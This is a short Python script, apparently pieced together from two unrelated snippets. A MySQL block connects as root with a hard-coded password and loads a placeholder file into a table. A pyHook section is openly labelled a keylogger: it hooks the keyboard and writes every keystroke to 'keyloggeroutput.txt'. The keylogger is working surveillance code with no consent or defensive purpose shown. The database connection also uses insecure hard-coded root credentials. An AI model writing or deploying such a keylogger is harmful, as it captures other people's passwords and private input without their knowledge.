import pyHook, pythoncom, os, sys, logging, subprocess

#SQL code starts
import mysql.connector

cnx = mysql.connector.connect(user='root', password='password',
                              host='localhost',
                              database='logs')

try:
   cursor = cnx.cursor()
   query = "LOAD DATA INFILE '/path/to/my/file' INTO TABLE sometable FIELDS TERMINATED BY ';' ENCLOSED BY '\"' ESCAPED BY '\\\\'"
   cursor.execute(query)
   cnx.commit()
finally:
    cnx.close()
#SQL code ends


file_log = 'keyloggeroutput.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
